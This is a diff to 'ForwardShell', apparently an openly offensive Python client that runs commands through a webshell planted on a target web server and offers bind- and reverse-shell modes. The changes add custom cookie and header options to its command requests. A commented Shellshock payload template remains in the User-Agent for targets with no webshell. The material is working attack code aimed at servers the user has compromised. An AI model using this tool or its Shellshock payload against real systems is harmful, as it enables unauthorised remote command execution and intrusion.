@@ -55,10 +55,22 @@ class WebShell(object):
         self.proxies = {}
         if options.P:
             self.proxies = {'http': f'{options.P}'}
-        if self.verbose and options.P: print(f"[VERBOSE] Using proxy {self.proxies['http']}")
+            if self.verbose: print(f"[VERBOSE] Using proxy {self.proxies['http']}")
 
-            
+        # Setup additional headers
+        self.headers = {}
+        self.headers['User-Agent'] = f'{__progname__}/{__version__}'
+
+        if options.C:
+            self.headers['Cookie'] = options.C
         
+        if options.H:
+            for header in options.H:
+                header_name, header_value =  header[0].split(':')
+                self.headers[f'{header_name.strip()}'] = header_value.strip()
+
+        if self.verbose: print(f"[VERBOSE] Add additional header {self.headers}")
+
         # Set up network speed
         self.interval=1 # == fast
         if self.verbose: print(f"[VERBOSE] Using network connection speed {options.speed}")
@@ -255,7 +267,6 @@ class WebShell(object):
 
         else:
             print(f"[ERROR] No Python found on target; PTY not possible")
-
 
     # Start ReverseShell
     def RevShell(self):
@@ -502,16 +513,17 @@ class WebShell(object):
 
     # Execute command
     def RunRawCmd(self, cmd, timeout=10):
-        # headers = {'User-Agent': f'() {{:;}}; {cmd}'} # MODIFY THIS: Payload in User-Agent if you have no Webshell but ShellShock
-        headers = {'User-Agent': f'{__progname__}/{__version__}'}
+
+        # self.headers = {'User-Agent': f'() {{:;}}; {cmd}'} # MODIFY THIS: Payload in User-Agent if you have no Webshell but ShellShock
+
         payload = cmd # Change this if your command needs some more adjustment
         data = {self.parameter: payload}
 
         try:
             if self.method == 'post':
-                    r = requests.post(self.url, data=data, headers=headers, proxies=self.proxies, timeout=timeout)
+                    r = requests.post(self.url, data=data, headers=self.headers, proxies=self.proxies, timeout=timeout)
             elif self.method == 'get':
-                    r = requests.get(self.url, params=data, headers=headers, proxies=self.proxies, timeout=timeout)
+                    r = requests.get(self.url, params=data, headers=self.headers, proxies=self.proxies, timeout=timeout)
             return r.text
         except:
             pass
@@ -670,7 +682,7 @@ class WebShell(object):
 # Process command-line arguments.
 if __name__ == '__main__':
     __progname__ = 'ForwardShell'
-    __version__ = '0.2.4'
+    __version__ = '0.2.5'
 
     parser = argparse.ArgumentParser(
         add_help = True,
@@ -682,6 +694,8 @@ if __name__ == '__main__':
     parser.add_argument('-m', action='store', metavar='', choices=['post', 'get'], default = 'POST', help='HTTP method to use for requests [GET, POST; default=POST]')
     parser.add_argument('-p', action='store', metavar='', default = 'cmd', help='The parameter of the uploaded webshell which executes the command [default=cmd]')
     parser.add_argument('-P', action='store', metavar='', default = '', help='Proxy to use for requests [http(s)://host:port]')
+    parser.add_argument('-C', action='store', metavar='', default = '', help='Add a custom session cookie')
+    parser.add_argument('-H', action='append', nargs='+', metavar='', help='Add one ore more additional header')
 
     group = parser.add_argument_group('you can use even more Bind- and ReverseShell arguments')
     group.add_argument('-lhost', action='store', metavar='', default = '127.0.0.1', help='Your local listening IP address if you use the ReverseShell option')
